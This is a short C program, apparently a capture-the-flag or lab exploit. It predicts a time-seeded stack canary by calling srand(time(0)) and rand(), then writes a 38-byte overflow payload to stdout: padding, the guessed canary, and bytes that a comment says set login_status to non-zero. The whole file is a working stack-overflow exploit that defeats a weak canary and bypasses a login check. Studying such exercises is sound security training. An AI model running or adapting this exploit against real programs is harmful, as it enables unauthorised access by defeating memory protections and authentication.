#include <stdlib.h>
#include <stdio.h>
#include <time.h>

char output_buf[38];

int generate_canary() {
	int canary;
	srand((int) time(0));

	canary = rand();
	//printf("Generated: 0x%08x\n", canary);
	return canary;
}

void format_output(int ret) {
	int i;
	for(i=0; i<32; i++){
		output_buf[i] = 0x41;
	}
        output_buf[32] = (ret >> (8*0) & 0xff);
        output_buf[33] = (ret >> (8*1) & 0xff);
        output_buf[34] = (ret >> (8*2) & 0xff);
        output_buf[35] = (ret >> (8*3) & 0xff);

	output_buf[36] = 0x42;
	output_buf[37] = 0x43; //this last byte sets the login_status to non-zero

	//printf("%02x%02x%02x%02x\n", output_buf[32], output_buf[33], output_buf[34], output_buf[35]);

	return;
}

void main() {
	int ret = generate_canary();
	format_output(ret);
	fwrite(output_buf, 1, sizeof(output_buf)-1, stdout);
	return;
}
